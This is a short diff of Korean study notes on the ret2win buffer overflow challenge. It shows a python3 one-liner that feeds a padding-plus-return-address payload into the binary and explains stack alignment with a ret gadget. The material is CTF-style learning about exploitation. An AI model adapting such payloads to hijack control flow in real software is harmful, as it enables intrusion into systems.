@@ -9,7 +9,7 @@ print해결방법은
 python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xe7\x06\x40\x00\x00\x00\x00\x00" + b"\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win
 이렇게 import sys; sys.stdut.buffer.write함수를 이용해, 페이로드 전달하는 것.
 
-16바이트 rsp레지스터 맞추기 위해 ret 가넷을 찾아 넣으면 다음 문장을 읽었을 때 pop rip가 되어 ret로 jump를 하게 되어 다시금 ret을 실행하여 pop rip가 된 후 ret2win함수로
+16바이트 rsp레지스터 맞추기 위해 ret하는 주소에 ret가넷을 찾아 넣으면 다음 문장을 읽었을 때 pop rip가 되어 ret로 jump를 하게 되어 다시금 ret을 실행하여 pop rip가 된 후 ret2win함수로
 jump할 수 있게 되는 것이다.
 8배수를 16배수로 맞춰준다는것이 핵심.
 
